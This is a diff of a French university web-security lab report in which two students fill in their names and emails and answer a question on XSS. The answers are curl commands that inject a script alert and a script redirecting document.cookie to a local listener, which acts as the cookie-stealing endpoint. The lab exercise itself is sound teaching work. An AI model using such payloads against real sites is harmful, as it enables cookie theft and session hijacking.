@@ -2,8 +2,8 @@
 
 ## Binome
 
-Nom, Prénom, email: ___
-Nom, Prénom, email: ___
+Nom, Prénom, email: KROL Mikolaï mikolai.krol.etu@univ-lille.fr
+Nom, Prénom, email: HOLVOET Adrien adrien.holvoet.etu@univ-lile.fr
 
 
 ## Question 1
@@ -43,8 +43,14 @@ sécurité. Expliquez comment vous avez corrigé la faille.
 ## Question 5
 
 * Commande curl pour afficher une fenetre de dialog. 
+```
+curl -d 'chaine=<script>alert("hello")</script>'  http://localhost:8080;
+```
 
 * Commande curl pour lire les cookies
+```
+curl -d 'chaine=<script>window.location.replace "localhost:4000/search?cookie=" + document.cookie</script>'  http://localhost:8080;
+```
 
 ## Question 6
 
